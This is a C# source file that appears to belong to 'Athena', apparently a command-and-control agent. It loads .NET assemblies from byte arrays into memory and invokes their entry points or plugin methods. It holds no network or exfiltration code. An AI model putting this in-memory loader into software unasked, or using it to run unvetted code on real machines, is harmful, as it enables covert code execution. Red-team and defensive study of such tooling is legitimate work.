using System;
using System.IO;
using System.Runtime.Loader;
using System.Text;

namespace Athena.Commands
{
    public class AssemblyHandler
    {
        public static string LoadAssembly(byte[] asm)
        {
            //This will load an assembly into our Assembly Load Context for usage with.
            //This can also be used to help fix resolving issues when loading assemblies in trimmed executables.
            try
            {
                //Load DLL Stream into our Assembly Load Context
                Globals.alc.LoadFromStream(new MemoryStream(asm));

                //Return true if success
                return "Assembly Loaded.";
            }
            catch (Exception e)
            {
                //Return false if failure
                return "Failed to load Assembly!" + Environment.NewLine + e.Message;
            }
        }
        public static bool ExecuteAssembly(byte[] asm, string args)
        {

            //This may have issues with long running tasks, will have to verify
            //May have to change this to write to named pipe, and have the main loop pull the output from there.
            //Maybe output like this?
            //https://stackoverflow.com/questions/11911660/redirect-console-writeline-from-windows-application-to-a-string

            //Will need to figure out how to determine when output is finished? Maybe add some sleeps and check the buffer, if nothing in the buffer then mark as complete and return?
            try
            {
                var assembly = Globals.alc.LoadFromStream(new MemoryStream(asm));
                assembly.EntryPoint.Invoke(null, new object[] { Utilities.Misc.SplitCommandLine(args) });
                return true;
            }
            catch
            {
                return false;
            }
        }
        public static string ClearAssemblyLoadContext()
        {
            //This will clear out the assembly load context for the Athena agent in order to leave it fresh for future use.
            //This will help scenarios where you have a library loaded with a specific version, but need to load that library again for a different one
            try
            {
                Globals.alc.Unload();  
                Globals.alc = new AssemblyLoadContext("Athena");
                return "AssemblyLoadContext cleared!";
            }
            catch (Exception e)
            {
                return "Failed to clear AssemblyLoadContext!" + Environment.NewLine + e.Message;
            }
        }
        public static string LoadCommand(byte[] asm, string name)
        {
            try
            {
                Globals.loadedcommands.Add(name, Globals.loadcontext.LoadFromStream(new MemoryStream(asm)));
                return "Command Loaded!";
            }
            catch (Exception e)
            {
                return "Failed to load Command!" + Environment.NewLine + e.Message;
            }
        }
        public static string RunLoadedCommand(string name, string args)
        {
            //Code from here: https://stackoverflow.com/questions/14479074/c-sharp-reflection-load-assembly-and-invoke-a-method-if-it-exists
            //In case still broken.
            Type t = Globals.loadedcommands[name].GetType("Athena.Plugin");
            var methodInfo = t.GetMethod("Execute", new Type[] { typeof(string[]) });
            var result = methodInfo.Invoke(null, new object[] { Utilities.Misc.SplitCommandLine(args) });
            return result.ToString();
        }
        public static string UnloadCommand(string name)
        {
            //Can I even do this?
            return "";
        }
    }
}
